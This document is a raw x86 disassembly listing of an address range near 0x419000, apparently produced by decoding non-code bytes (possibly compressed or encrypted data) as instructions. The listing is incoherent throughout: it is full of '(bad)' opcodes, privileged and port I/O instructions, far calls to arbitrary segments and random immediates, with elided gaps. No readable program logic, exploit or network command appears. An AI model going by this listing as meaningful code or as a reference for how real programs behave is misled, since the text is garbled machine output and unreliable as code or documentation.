  419025:	adc    ch,BYTE PTR [edx-0x45]
  419028:	add    bl,BYTE PTR [edi+0x75]
  41902b:	mov    ebx,0xea589da9
  419030:	icebp  
  419031:	push   cs
  419032:	jp     0x41905b
  419034:	mov    esi,0x1c398c50
  419039:	xchg   ecx,eax
  41903a:	push   ebx
  41903b:	sbb    eax,ecx
  41903d:	mov    ds:0x2764ac83,al
  419042:	sbb    BYTE PTR [ebp-0x1a4f9ff7],ah
  419048:	mov    esp,0x5c5f82ab
  41904d:	push   esi
  41904e:	jb     0x4190c2
  419050:	inc    edx
  419051:	inc    ecx
  419052:	sbb    eax,0x4c74ae32
  419057:	scas   eax,DWORD PTR es:[edi]
  419058:	loopne 0x4190bc
  41905a:	or     BYTE PTR [ecx],0x43
  41905d:	sbb    edx,ecx
  41905f:	(bad)  
  419061:	xchg   edx,eax
  419063:	inc    edi
  419064:	mov    ah,0xfb
  419066:	cmp    BYTE PTR [ebp+0x28],ah
  419069:	add    eax,0xef767d60
  41906e:	sahf   
  41906f:	pop    ebp
  419070:	imul   edi,DWORD PTR [ecx-0x443e135],0x57
  419077:	xor    ebx,DWORD PTR [ebx*2-0x6d081fe2]
  41907e:	cmp    al,BYTE PTR [edx]
  419080:	rcl    BYTE PTR [ebx-0x5f06d997],0x6a
  419087:	push   ebp
  419088:	(bad)  
  419089:	cli    
  41908a:	cwde   
  41908b:	inc    eax
  41908c:	dec    ebx
  41908d:	sub    ecx,ebp
  41908f:	(bad)  
  419090:	rol    DWORD PTR [eax-0x7151e316],1
  419096:	int    0xc1
  419098:	loope  0x419080
  41909a:	push   ebx
  41909b:	ds push ebx
  41909d:	jl     0x4190a2
  41909f:	adc    esp,eax
  4190a1:	push   eax
  4190a2:	mov    eax,ds:0x9158ef6a
  4190a7:	mov    BYTE PTR [edx+0x7f],bl
  4190aa:	sub    DWORD PTR [ebx],ebp
  4190ac:	icebp  
  4190ad:	ret    0x50e9
  4190b0:	nop
  4190b1:	outs   dx,BYTE PTR ds:[esi]
  4190b2:	idiv   BYTE PTR [ecx+0x3bb91e19]
  4190b8:	retf   0xae93
  4190bb:	enter  0x6ef1,0x8c
  4190bf:	cmp    edx,ebp
  4190c1:	inc    edi
  4190c2:	imul   esp,DWORD PTR [ebx-0x63095bc8],0xb2c99d5
  4190cc:	dec    esp
  4190cd:	adc    DWORD PTR [ecx-0x2473384f],0xccfb2daf
  4190d7:	lahf   
  4190d8:	jno    0x419075
  4190da:	rcr    DWORD PTR [ecx+edx*2-0x4ac9b6fd],cl
  4190e1:	cli    
  4190e2:	and    bh,BYTE PTR [edx+0x40]
  4190e5:	jbe    0x419149
  4190e7:	dec    esp
  4190e8:	nop
  4190e9:	cld    
  4190ea:	sbb    BYTE PTR [ebp-0x77],cl
  4190ed:	hlt    
  4190ee:	imul   ebp,ecx,0xd46e45af
  4190f4:	enter  0x2bdd,0xa9
  4190f8:	clc    
  4190f9:	cmp    edi,ebx
  4190fb:	push   ecx
  4190fc:	cmp    BYTE PTR [edi],bl
  4190fe:	adc    BYTE PTR [edx+0x2c103581],bl
  419104:	call   0x4b13:0x2ed93b0f
  41910b:	retf   0xf1fe
  41910e:	inc    ebp
  41910f:	pusha  
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     cl,BYTE PTR [ebx]
  419181:	les    edx,FWORD PTR [edi+edi*1-0x48]
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR [ecx+eax*1],al
  41918a:	add    BYTE PTR [eax],al
  41918c:	inc    esi
  41918d:	mov    al,0x20
  41918f:	ret    
  419190:	jo     0x4191e7
  419192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419193:	dec    eax
  419194:	outs   dx,DWORD PTR ds:[esi]
  419195:	dec    edx
  419196:	shl    edi,cl
  419198:	repnz or ebx,DWORD PTR cs:0x48bce298
  4191a0:	and    cl,BYTE PTR [edi-0x40d3cc56]
  4191a6:	hlt    
  4191a7:	sub    al,0x4a
  4191a9:	cmp    eax,DWORD PTR [ebp-0x33]
  4191ac:	or     DWORD PTR [ebx+ebx*8-0x1a2654c1],edx
  4191b3:	test   al,0x19
  4191b5:	mov    bl,0xd3
  4191b7:	lahf   
  4191b8:	mov    al,ds:0x794b5453
  4191bd:	xor    ebx,DWORD PTR [ebp+0x3b]
  4191c0:	out    dx,eax
  4191c1:	cmp    al,0x6
  4191c3:	add    al,0xca
  4191c5:	cwde   
  4191c6:	xor    ecx,DWORD PTR [esi]
  4191c8:	test   DWORD PTR [edx+eax*8],ecx
  4191cb:	mul    BYTE PTR [edx]
  4191cd:	(bad)  
  4191ce:	mov    ebx,0xc4de1006
  4191d3:	cs and ch,ah
  4191d6:	xor    BYTE PTR [ecx+0x533e207e],0x55
  4191dd:	fcmovnb st,st(5)
  4191df:	in     eax,0x6b
  4191e1:	mov    ecx,0x9995122c
  4191e6:	pop    ss
  4191e7:	hlt    
  4191e8:	(bad)  
  4191e9:	dec    ebp
  4191ea:	ja     0x419214
  4191ec:	repnz inc BYTE PTR ss:[ebx]
  4191f0:	pop    ss
  4191f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191f2:	je     0x419207
  4191f4:	mov    WORD PTR [eax-0x52],?
  4191f7:	scas   eax,DWORD PTR es:[edi]
  4191f8:	mov    ds:0x163bb575,al
  4191fd:	lods   al,BYTE PTR ds:[esi]
  4191fe:	and    eax,0x9da862e1
  419203:	cli    
  419204:	lods   eax,DWORD PTR ds:[esi]
  419205:	and    eax,0x53ff209f
  41920a:	pop    ds
  41920b:	mov    esp,0x2042311d
  419210:	xchg   ebp,eax
  419211:	inc    eax
  419212:	ret    
  419213:	or     al,0xb1
  419215:	pop    esp
  419216:	inc    ebx
  419217:	mov    cl,0xda
  419219:	cs pushf 
  41921b:	leave  
  41921c:	sub    al,0x38
  41921e:	sbb    DWORD PTR [ebx+0x7b],edx
  419221:	mov    bl,dl
  419223:	lahf   
  419224:	dec    edx
  419225:	mov    ebx,0xd168ade3
  41922a:	xchg   ebx,eax
  41922b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41922c:	or     BYTE PTR [ebx],cl
  41922e:	push   ebp
  41922f:	sub    DWORD PTR [esi],edi
  419231:	adc    bl,BYTE PTR [esi+eiz*1]
  419234:	das    
  419235:	cwde   
  419236:	fldenv [eax-0x35]
  419239:	inc    ecx
  41923a:	hlt    
  41923b:	int3   
  41923c:	lods   eax,DWORD PTR ds:[esi]
  41923d:	cld    
  41923e:	xchg   edi,eax
  41923f:	enter  0x86cd,0xa
  419243:	mov    ebp,es
  419245:	xor    al,0x26
  419247:	shl    DWORD PTR fs:[eax+0x4f],0xa7
  41924c:	sbb    DWORD PTR es:[eax-0x31],esi
  419250:	mov    ds:0x43396f88,al
  419255:	cmp    eax,0x9be49e14
  41925a:	push   es
  41925b:	fist   WORD PTR [ecx-0x492d1310]
  419261:	test   DWORD PTR ds:0x10898188,edi
  419267:	cmp    eax,0x1d9b84c2
  41926c:	stos   BYTE PTR es:[edi],al
  41926d:	cwde   
  41926e:	fistp  DWORD PTR [eax]
  419270:	call   0x16499504
  419275:	mov    edi,eax
  419277:	pushf  
  419278:	ror    BYTE PTR [edi+0x7f33e8b3],0xd2
  41927f:	sbb    BYTE PTR [edx+ecx*8+0x3],cl
  419283:	adc    DWORD PTR [esi],edx
  419285:	or     al,0x3e
  419287:	lods   al,BYTE PTR ds:[si]
  419289:	and    eax,DWORD PTR [edx+0x259e4e9c]
  41928f:	push   0x0
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	push   0xffffff8d
  419302:	sub    BYTE PTR [ebx-0x44],dl
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR [ecx+eax*1],al
  41930a:	add    BYTE PTR [eax],al
  41930c:	stos   BYTE PTR es:[edi],al
  41930d:	fwait
  41930e:	jno    0x419336
  419310:	jnp    0x4192fd
  419312:	clc    
  419313:	mov    WORD PTR [eax+0x4d],es
  419316:	fmulp  st(7),st
  419318:	sbb    edi,DWORD PTR [edi-0x4]
  41931b:	pop    ecx
  41931c:	or     BYTE PTR [esi-0x5d],ah
  41931f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419320:	cs sub bh,bl
  419323:	dec    ebx
  419324:	inc    edi
  419325:	adc    eax,0xa8a6ccdf
  41932a:	xchg   ebx,eax
  41932b:	mov    ecx,0xfb1b231a
  419330:	push   ss
  419331:	addr16 pop es
  419333:	mov    BYTE PTR ds:0xc41e8cf4,ah
  419339:	inc    ecx
  41933a:	inc    ebp
  41933b:	jbe    0x419369
  41933d:	cmp    esp,eax
  41933f:	fwait
  419340:	jb     0x4192cc
  419342:	push   ss
  419343:	mov    ecx,0xfde2ee08
  419348:	ds and bh,ah
  41934b:	pushf  
  41934c:	add    BYTE PTR [esi-0x65],al
  41934f:	adc    al,0x5d
  419351:	fnstenv [edi+esi*2+0x40]
  419355:	jecxz  0x419306
  419357:	inc    esp
  419358:	pop    ds
  419359:	test   eax,0xf9e09b7c
  41935e:	jo     0x4192ec
  419360:	adc    al,0x60
  419362:	dec    ebp
  419363:	push   ebp
  419364:	xchg   edi,eax
  419365:	ror    BYTE PTR [ecx],0x24
  419368:	inc    ebp
  419369:	dec    ecx
  41936a:	fcom   QWORD PTR [eax]
  41936c:	lahf   
  41936d:	xchg   esp,eax
  41936e:	mov    eax,ds:0x81b07bc8
  419373:	sbb    al,0x9e
  419375:	pop    ebx
  419376:	or     ch,ah
  419378:	jl     0x419393
  41937a:	pop    ecx
  41937b:	sbb    BYTE PTR [ebp+0x72],dh
  41937e:	aaa    
  41937f:	js     0x41933e
  419381:	jae    0x4193fd
  419383:	nop
  419384:	jl     0x4193a6
  419386:	in     al,dx
  419387:	xlat   BYTE PTR ds:[ebx]
  419388:	or     dh,BYTE PTR [ecx]
  41938a:	out    0xe1,eax
  41938c:	pop    ebx
  41938d:	dec    ebp
  41938e:	retf   0x5a3e
  419391:	sti    
  419392:	rcl    BYTE PTR [edx+esi*4],1
  419395:	and    al,0xd
  419397:	xor    DWORD PTR [edx],0x8a4bd9ee
  41939d:	enter  0x51ff,0xe5
  4193a1:	fisttp WORD PTR [ebp-0x58]
  4193a4:	jecxz  0x41932b
  4193a6:	xchg   ebp,eax
  4193a7:	imul   BYTE PTR [ebx+0x5b]
  4193aa:	dec    ecx
  4193ab:	jns    0x41941f
  4193ad:	and    edi,ebx
  4193af:	cmp    ebp,ecx
  4193b1:	push   ebp
  4193b2:	pop    esp
  4193b3:	addps  xmm1,XMMWORD PTR [esi]
  4193b6:	jmp    0x6f34883f
  4193bb:	inc    ecx
  4193bc:	push   esi
  4193bd:	pop    es
  4193be:	cdq    
  4193bf:	or     DWORD PTR [eax-0x64],0x9ba11f50
  4193c6:	pushf  
  4193c7:	or     al,0x15
  4193c9:	in     eax,0x97
  4193cb:	xchg   esi,eax
  4193cc:	popa   
  4193cd:	sbb    DWORD PTR [edi+0x39],0xc707b85
  4193d4:	pop    esi
  4193d5:	retf   0xe8
  4193d8:	add    al,0x5
  4193da:	pusha  
  4193db:	fndisi(8087 only) 
  4193dd:	mov    ecx,0x842bebde
  4193e2:	jmp    0xcc5c:0xdd9a5f2e
  4193e9:	aam    0xc5
  4193eb:	jl     0x419469
  4193ed:	push   edx
  4193ee:	aam    0x26
  4193f0:	sub    DWORD PTR [ebx],ebp
  4193f2:	test   eax,0xd6880791
  4193f7:	call   0x2f13:0xfdd62b61
  4193fe:	dec    eax
  4193ff:	neg    DWORD PTR [ebx+0x35e61591]
  419405:	scas   eax,DWORD PTR es:[edi]
  419406:	and    ebp,DWORD PTR [ecx+esi*8+0x419429bc]
  41940d:	(bad)  
  41940f:	adc    eax,DWORD PTR [eax]
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	jg     0x419458
  419482:	test   esp,ebp
  419484:	ror    BYTE PTR [ebx],0x1
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	repz mov cl,BYTE PTR [ebx-0x3a]
  419490:	xor    DWORD PTR [ecx],edx
  419492:	bnd jp 0x419481
  419495:	call   0x5e33acec
  41949a:	dec    edi
  41949b:	jle    0x41944b
  41949d:	mov    eax,0x4c2039b9
  4194a2:	pop    ds
  4194a3:	and    eax,0xf4e649e3
  4194a8:	fsub   QWORD PTR [edi]
  4194aa:	mov    ah,0x32
  4194ac:	jecxz  0x419454
  4194ae:	jb     0x419450
  4194b0:	adc    DWORD PTR [eax],esp
  4194b2:	out    0xd2,al
  4194b4:	fwait
  4194b5:	sbb    al,0x9e
  4194b7:	or     BYTE PTR [ebp+0x243c59f2],dh
  4194bd:	add    cl,BYTE PTR [ebx-0x78]
  4194c0:	mov    WORD PTR [ebp+0x506b7a90],ss
  4194c6:	iret   
  4194c7:	(bad)  
  4194c8:	jp     0x4194b2
  4194ca:	call   0xe1308576
  4194cf:	jle    0x419474
  4194d1:	popf   
  4194d2:	dec    edx
  4194d3:	inc    edx
  4194d4:	lea    edi,[esi]
  4194d6:	sbb    ebp,DWORD PTR [ebx]
  4194d8:	sbb    al,0xff
  4194da:	outs   dx,DWORD PTR ds:[esi]
  4194db:	ins    DWORD PTR es:[edi],dx
  4194dc:	jmp    0x41951c
  4194de:	xor    DWORD PTR [eax+0x29d3787e],ebp
  4194e4:	add    al,0x56
  4194e6:	stos   DWORD PTR es:[edi],eax
  4194e7:	lea    edi,[eax-0x9dbf4b2]
  4194ed:	or     cl,BYTE PTR [ebp+0x7d]
  4194f0:	cmp    ebx,DWORD PTR [edi]
  4194f2:	test   al,0xa8
  4194f4:	mov    ecx,0xaf696b69
  4194f9:	add    BYTE PTR ds:0x65b12f8f,bh
  4194ff:	hlt    
  419500:	pop    ss
  419501:	mov    dl,0x70
  419503:	rcr    BYTE PTR [eax],cl
  419505:	test   al,0x5e
  419507:	into   
  419508:	lods   eax,DWORD PTR ds:[esi]
  419509:	pop    ebp
  41950a:	int    0x6f
  41950c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41950d:	mov    bl,0x83
  41950f:	push   eax
  419510:	pushf  
  419511:	mov    eax,ds:0xcca6abf1
  419516:	add    ch,BYTE PTR [ebp+0x7412269c]
  41951c:	cmp    eax,0x7f0e9f32
  419521:	mov    WORD PTR [ebp+0x5e],ds
  419524:	pop    eax
  419525:	mov    bh,0x11
  419527:	(bad)  
  419528:	ds pop ebx
  41952a:	cmp    DWORD PTR [ebx+edi*1-0x6744ba48],ebx
  419531:	aas    
  419532:	xor    DWORD PTR [ebp-0x2a56bf09],ecx
  419538:	aaa    
  419539:	lahf   
  41953a:	jmp    0x419591
  41953c:	jmp    0x52c4:0x475fbe6
  419543:	dec    edi
  419544:	sbb    esp,esp
  419546:	fisub  DWORD PTR [edx]
  419548:	mov    esi,0x2ddf8d89
  41954d:	in     al,0x7a
  41954f:	ja     0x419535
  419551:	xchg   esi,eax
  419552:	xor    al,0xc0
  419554:	rol    BYTE PTR [ebx],cl
  419556:	cmp    al,0x1c
  419558:	jmp    0x41952b
  41955a:	popa   
  41955b:	ins    BYTE PTR es:[edi],dx
  41955c:	ss scas al,BYTE PTR es:[edi]
  41955e:	ins    DWORD PTR es:[edi],dx
  41955f:	outs   dx,BYTE PTR ds:[esi]
  419560:	fs pop ds
  419562:	cs daa 
  419564:	cmp    DWORD PTR [ebp+0x14],0x3b163bf4
  41956b:	call   0x271b:0xdaa0284e
  419572:	add    DWORD PTR [edi+0x64],0x26
  419576:	lea    ebp,[ecx-0x46]
  419579:	scas   al,BYTE PTR es:[edi]
  41957a:	imul   esi,DWORD PTR [esp+eax*1+0x4ff61413],0xddde0ecf
  419585:	xchg   esp,eax
  419586:	or     cl,BYTE PTR ds:0x2abc55c4
  41958c:	je     0x419584
  41958e:	js     0x419522
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	xchg   BYTE PTR [esp+esi*4],ch
  419603:	pop    ebp
  419604:	les    ecx,FWORD PTR [ecx+eax*1]
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	scas   al,BYTE PTR es:[edi]
  41960d:	ins    DWORD PTR es:[edi],dx
  41960e:	(bad)  
  41960f:	int    0x58
  419611:	int3   
  419612:	jecxz  0x419653
  419614:	push   ds
  419615:	and    al,0x4f
  419617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419618:	xor    DWORD PTR [eax],ebp
  41961a:	(bad)  
  41961b:	cmp    DWORD PTR [esi+0x33],edi
  41961e:	mov    ah,0xc5
  419620:	mov    DWORD PTR [edx],edi
  419622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419623:	shl    DWORD PTR [ebp+0x32],1
  419626:	stos   DWORD PTR es:[edi],eax
  419627:	fld    QWORD PTR [edi-0x1d995971]
  41962d:	stc    
  41962e:	fld    DWORD PTR [ecx-0x9c7f003]
  419634:	inc    edx
  419635:	dec    edi
  419636:	add    al,0x55
  419638:	pushf  
  419639:	in     al,0xc3
  41963b:	adc    BYTE PTR [ebx],dh
  41963d:	in     eax,dx
  41963e:	lock mul ecx
  419641:	ret    
  419642:	jae    0x4195f9
  419644:	add    BYTE PTR [ebp-0x67],bh
  419647:	xor    DWORD PTR [ebp+0x2d],edx
  41964a:	xor    BYTE PTR [eax],al
  41964c:	lahf   
  41964d:	pmulhw mm1,QWORD PTR [ebx]
  419650:	xor    BYTE PTR [edi],bh
  419652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419653:	call   0x4f5f:0x268af0bc
  41965a:	inc    esp
  41965b:	out    dx,eax
  41965c:	repnz les eax,FWORD PTR [edx-0x6a]
  419660:	les    esi,FWORD PTR [eax]
  419662:	sub    dl,ah
  419664:	adc    cl,BYTE PTR [ebx]
  419666:	lods   al,BYTE PTR ds:[esi]
  419667:	push   0xffffffd7
  419669:	clc    
  41966a:	fsubr  QWORD PTR [edi]
  41966c:	jl     0x41964e
  41966e:	push   cs
  41966f:	add    al,0xa0
  419671:	mov    eax,0xb4c35b6c
  419676:	mov    ecx,0xc6119cbb
  41967b:	out    dx,eax
  41967c:	ja     0x41967d
  41967e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41967f:	pop    ebp
  419680:	sbb    DWORD PTR [edx],0xffffff8b
  419683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419684:	sub    cl,BYTE PTR [edi+0x4308fc7b]
  41968a:	shr    cl,1
  41968c:	or     edi,0xada6a911
  419692:	push   eax
  419693:	cli    
  419694:	dec    eax
  419695:	sub    dl,BYTE PTR es:[eax]
  419698:	scas   eax,DWORD PTR es:[edi]
  419699:	mov    ebx,0xd642d41b
  41969e:	aam    0x72
  4196a0:	scas   eax,DWORD PTR es:[edi]
  4196a1:	xchg   BYTE PTR [edx+0x38],cl
  4196a4:	pushf  
  4196a5:	xor    DWORD PTR [ebp-0x4e595c05],esp
  4196ab:	push   ecx
  4196ac:	xchg   bh,bl
  4196ae:	cmp    ebx,DWORD PTR [edi+ebx*1-0x6f]
  4196b2:	ss clc 
  4196b4:	mov    dl,0x5d
  4196b6:	sbb    edx,esi
  4196b8:	stos   DWORD PTR es:[edi],eax
  4196b9:	pop    edi
  4196ba:	push   ds
  4196bb:	cmp    al,0xb6
  4196bd:	iret   
  4196be:	rcl    BYTE PTR [edi],cl
  4196c0:	(bad)  
  4196c1:	cli    
  4196c2:	or     ah,ah
  4196c4:	test   BYTE PTR [edi-0xd],bl
  4196c7:	lds    edi,FWORD PTR [ebx+0x7e]
  4196ca:	fistp  DWORD PTR [esi+0x2d25f]
  4196d0:	dec    ebp
  4196d1:	add    bl,bl
  4196d3:	outs   dx,BYTE PTR ds:[esi]
  4196d4:	add    bl,BYTE PTR [ebp+0x5f]
  4196d7:	jle    0x4196f1
  4196d9:	iret   
  4196da:	or     al,0x65
  4196dc:	hlt    
  4196dd:	jg     0x41974f
  4196df:	clc    
  4196e0:	mov    bl,0xe6
  4196e2:	or     al,0xd3
  4196e4:	inc    esp
  4196e5:	xor    eax,0xb0435454
  4196ea:	mov    edx,DWORD PTR [ecx-0x3614a4c7]
  4196f0:	dec    edi
  4196f1:	test   DWORD PTR [eax-0x4fa0e439],esp
  4196f7:	dec    edi
  4196f8:	gs mov ah,0x89
  4196fb:	movhps xmm0,QWORD PTR [edi]
  4196fe:	xchg   edx,eax
  4196ff:	mov    al,ds:0x2634c090
  419704:	pop    esi
  419705:	in     al,dx
  419706:	xchg   ebx,eax
  419707:	sbb    eax,0x9e9c3d48
  41970c:	popa   
  41970d:	scas   eax,DWORD PTR es:[edi]
  41970e:	sti    
  41970f:	add    eax,0x0
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x998dd0ae
  419781:	shl    DWORD PTR [ebp-0x4b],1
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	nop
  41978d:	fwait
  41978e:	scas   eax,DWORD PTR es:[edi]
  41978f:	out    0x25,eax
  419791:	test   eax,0x31a0615d
  419796:	push   ecx
  419797:	fisttp WORD PTR [ebp+0x61d52a3c]
  41979d:	push   edx
  41979e:	adc    ch,BYTE PTR [esi+edi*8-0x7f]
  4197a2:	mov    BYTE PTR [ebp+0x2af56cbd],bh
  4197a8:	adc    DWORD PTR [bx+di-0x60],esp
  4197ac:	mov    DWORD PTR [edi-0x172e63df],ecx
  4197b2:	mov    dh,BYTE PTR [edx+0x7f]
  4197b5:	add    ecx,DWORD PTR [edi+0x7e]
  4197b8:	je     0x41975e
  4197ba:	mov    ?,esp
  4197bc:	pop    ecx
  4197bd:	sub    BYTE PTR [edi+0x2e9dd5ea],dh
  4197c3:	inc    edx
  4197c4:	xchg   DWORD PTR [esi+0x2f],esi
  4197c7:	imul   edi,esp,0xf85f778e
  4197cd:	sbb    ch,ch
  4197cf:	jmp    0x419751
  4197d1:	mov    ch,0x9
  4197d3:	push   es
  4197d4:	sbb    bh,BYTE PTR [edi-0x123da904]
  4197da:	xor    eax,0x4a5c3e81
  4197df:	fs jb  0x4197dd
  4197e2:	mov    edx,0xdfe0ebf2
  4197e7:	mov    ds:0xc20fcf52,al
  4197ec:	or     DWORD PTR [edi-0x28],ebp
  4197ef:	je     0x41985d
  4197f1:	test   eax,0xc1541d3c
  4197f6:	jp     0x419855
  4197f8:	fcos   
  4197fa:	mov    al,0x37
  4197fc:	sti    
  4197fd:	and    ah,BYTE PTR [edx+0x47e128be]
  419803:	lods   eax,DWORD PTR ds:[esi]
  419804:	sti    
  419805:	pop    edi
  419806:	stos   BYTE PTR es:[edi],al
  419807:	psraw  mm3,QWORD PTR [edi+0x6a]
  41980b:	clc    
  41980c:	inc    eax
  41980d:	shl    DWORD PTR [ecx-0x31],1
  419810:	cmp    eax,0xdcf46177
  419815:	or     BYTE PTR [edi-0x48f95d6f],0xf7
  41981c:	shr    BYTE PTR [ebx],cl
  41981e:	aad    0x5b
  419820:	rcr    BYTE PTR [edi+edi*2],1
  419823:	adc    eax,0xced028d0
  419828:	in     eax,dx
  419829:	sbb    al,0xc0
  41982b:	or     BYTE PTR [ecx+0x6],bl
  41982e:	in     eax,0xdf
  419830:	xor    al,0x4
  419832:	lea    esi,[edi-0x6c0de5c0]
  419838:	cs and al,0xc9
  41983b:	sbb    DWORD PTR [ebx-0x4358d248],edi
  419841:	stos   DWORD PTR es:[edi],eax
  419842:	or     BYTE PTR [edi],bl
  419844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419845:	pop    edi
  419846:	push   0xffffffee
  419848:	push   esp
  419849:	mov    ds:0x224e3c72,al
  41984e:	adc    edx,DWORD PTR [ecx]
  419850:	sbb    al,0xf2
  419852:	outs   dx,BYTE PTR ds:[esi]
  419853:	mov    esi,0x85c47b13
  419858:	sub    ah,bh
  41985a:	add    ch,cl
  41985c:	nop
  41985d:	cmp    edx,ebx
  41985f:	les    edx,FWORD PTR [eax-0x1168eecf]
  419865:	and    eax,esp
  419867:	pop    esi
  419868:	(bad)  
  419869:	jbe    0x41987b
  41986b:	es cmp eax,0xd27bac19
  419871:	in     al,dx
  419872:	shl    DWORD PTR [ecx-0x25],cl
  419875:	jle    0x419809
  419877:	imul   ecx,DWORD PTR [esi]
  41987a:	push   ecx
  41987b:	dec    edi
  41987c:	fs mov ch,0x40
  41987f:	hlt    
  419880:	mov    eax,0xdd43b236
  419885:	pop    ss
  419886:	sub    al,0xa0
  419888:	xchg   esp,eax
  419889:	cwde   
  41988a:	lds    ebp,FWORD PTR [eax-0x3]
  41988d:	push   ebp
  41988e:	mov    edi,DWORD PTR [ebx+0x0]
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	frstor ds:0xcca992ef
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	inc    BYTE PTR [ebx]
  41990e:	jnp    0x4198c6
  419910:	int    0x92
  419912:	xchg   al,dl
  419914:	popf   
  419915:	js     0x41990c
  419917:	div    BYTE PTR [ecx]
  419919:	sbb    eax,0xd1f52843
  41991e:	sub    esi,edx
  419920:	mov    ebx,0x89f527bb
  419925:	mov    DWORD PTR [ecx+esi*8+0x76aa983],esi
  41992c:	cmp    BYTE PTR [eax+0x3cee40b2],cl
  419932:	sti    
  419933:	or     cl,BYTE PTR [edi-0x7]
  419936:	jae    0x41993c
  419938:	lock cmp eax,0x52a83ad9
  41993e:	sub    ch,bl
  419940:	retf   0x357
  419943:	mulps  xmm5,XMMWORD PTR [ebx-0x55]
  419947:	sub    al,0xb6
  419949:	jo     0x4198d4
  41994b:	icebp  
  41994c:	mov    ah,0xca
  41994e:	ja     0x4199a1
  419950:	cmp    DWORD PTR [ebx-0x22729170],0xffffffd1
  419957:	xchg   edx,eax
  419958:	inc    edx
  419959:	pop    eax
  41995a:	out    0xae,eax
  41995c:	test   BYTE PTR ds:0xc280a3d5,dh
  419962:	jp     0x4199b2
  419964:	cmp    esp,DWORD PTR [ebp+0x122ee653]
  41996a:	dec    eax
  41996b:	ins    DWORD PTR es:[edi],dx
  41996c:	sub    al,BYTE PTR [ecx-0x71]
  41996f:	or     al,0x2b
  419971:	rcr    BYTE PTR [edx],cl
  419973:	sbb    DWORD PTR ds:0x43f5bb12,eax
  419979:	dec    ebx
  41997a:	cmp    ebp,DWORD PTR [ebx-0x5e573ce3]
  419980:	push   ecx
  419981:	scas   al,BYTE PTR es:[edi]
  419982:	jae    0x419910
  419984:	jp     0x419916
  419986:	mov    eax,0xa916bc50
  41998c:	jg     0x4199a3
  41998e:	cmc    
  41998f:	cmp    BYTE PTR [eax+ebp*1+0x72],0xfc
  419994:	add    eax,0x9e485ee
  419999:	jb     0x419a10
  41999b:	mov    ds:0xa149efe5,al
  4199a0:	fisub  DWORD PTR [edx+0x26c649fe]
  4199a6:	mov    esi,DWORD PTR [ecx+edi*4]
  4199a9:	mov    ecx,0x5b9d06ec
  4199ae:	stos   BYTE PTR es:[edi],al
  4199af:	mov    al,0xd8
  4199b1:	cmp    DWORD PTR [ebx],edx
  4199b3:	cmp    DWORD PTR [eax+0x23],ebx
  4199b6:	mov    esi,0x1a1c2e1c
  4199bb:	mov    al,0xdd
  4199bd:	cli    
  4199be:	sub    BYTE PTR [esi+0x6e],al
  4199c1:	adc    ah,BYTE PTR [esi]
  4199c3:	test   BYTE PTR [edx-0x4ddf7c80],dh
  4199c9:	push   edi
  4199ca:	and    DWORD PTR [edi],edi
  4199cc:	sbb    dh,dh
  4199ce:	adc    al,0xb7
  4199d0:	push   ebx
  4199d1:	lahf   
  4199d2:	ret    
  4199d3:	cmp    eax,0xd537821a
  4199d8:	mov    ebx,0x9d7eab4f
  4199dd:	pop    ss
  4199de:	test   eax,0x17602b50
  4199e3:	cmp    al,0x88
  4199e5:	aad    0xff
  4199e7:	retf   0x43a6
  4199ea:	call   0xa981:0xf0a11c3f
  4199f1:	push   0x4c5bc5f2
  4199f6:	dec    esi
  4199f7:	aam    0x34
  4199f9:	sub    eax,0x44cb9765
  4199fe:	push   eax
  4199ff:	push   ebx
  419a00:	ss or  bh,ch
  419a03:	outs   dx,DWORD PTR ds:[esi]
  419a04:	push   edi
  419a05:	sub    ah,bh
  419a07:	jnp    0x4199fd
  419a09:	mov    esp,DWORD PTR [eax]
  419a0b:	xor    eax,0x13dd94f8
	...
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x57b494c2,cl
  419a83:	pusha  
  419a84:	ror    BYTE PTR [edi],1
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	loopne 0x419a8f
